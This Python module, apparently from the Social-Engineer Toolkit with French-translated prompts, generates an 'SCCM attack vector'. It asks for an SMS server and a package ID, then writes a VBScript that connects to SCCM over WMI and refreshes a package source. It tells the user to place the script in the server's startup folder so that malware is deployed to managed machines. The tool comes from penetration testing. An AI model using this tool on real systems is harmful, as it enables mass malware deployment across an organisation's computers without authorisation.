#!/usr/bin/python
# coding=utf-8

import os

import src.core.setcore as core

# Py2/3 compatibility
# Python3 renamed raw_input to input
try:
    input = raw_input
except NameError:
    pass

print("Le" + core.bcolors.BOLD + " vecteur d'attaque SCCM " + core.bcolors.ENDC +
      "va utiliser les configurations SCCM pour déployer un logiciel malveillant. \n\n"
      "Vous devez disposer du nom du serveur SMS et de l'ID du package à empaqueter "
      "sur le site. Vous devez ensuite copier ce fichier de configuration dans le "
      "dossier de démarrage pour tous les utilisateurs du serveur.")

sms_server = input("Entrez l'adresse IP ou le nom d'hôte du serveur SMS : ")
package_id = input("Entrez l'ID du package que vous voulez patcher : ")

configuration = r'''
# configuration file written by Dave DeSimone and Bill Readshaw
# attack vector presented at Defcon 20
# added to set 07/27/2012

strSMSServer = "{0}"
strPackageID = "{1}"

Set objLoc =  CreateObject("WbemScripting.SWbemLocator")
Set objSMS= objLoc.ConnectServer(strSMSServer, "root\sms")
Set Results = objSMS.ExecQuery _
   ("SELECT * From SMS_ProviderLocation WHERE ProviderForLocalSite = true")
 For each Loc in Results
   If Loc.ProviderForLocalSite = True Then
     Set objSMS2 = objLoc.ConnectServer(Loc.Machine, "root\sms\site_"& _
        Loc.SiteCode)
     strSMSSiteCode = Loc.SiteCode
   end if
 Next

Set objPkgs = objSMS2.ExecQuery("select * from SMS_Package where PackageID = '" & strPackageID & "'")
for each objPkg in objPkgs
objPkg.RefreshPkgSource(0)
Next
'''.format(sms_server, package_id)

# write out the file to reports
with open(os.path.join(core.userconfigpath, "reports/sccm_configuration.txt"), 'w') as filewrite:
    filewrite.write(configuration)
core.print_status("Le script de configuration SCCM a été créé avec succès.")
core.print_status("Vous devez copier le script dans le dossier de démarrage du serveur.")
core.print_status("Le rapport a été exporté vers {0}".format(os.path.join(core.definepath, "reports/sccm_configuration.txt")))
pause = input("Appuyez sur " + core.bcolors.RED + "{entrée} " + core.bcolors.ENDC + "pour quitter ce menu.")
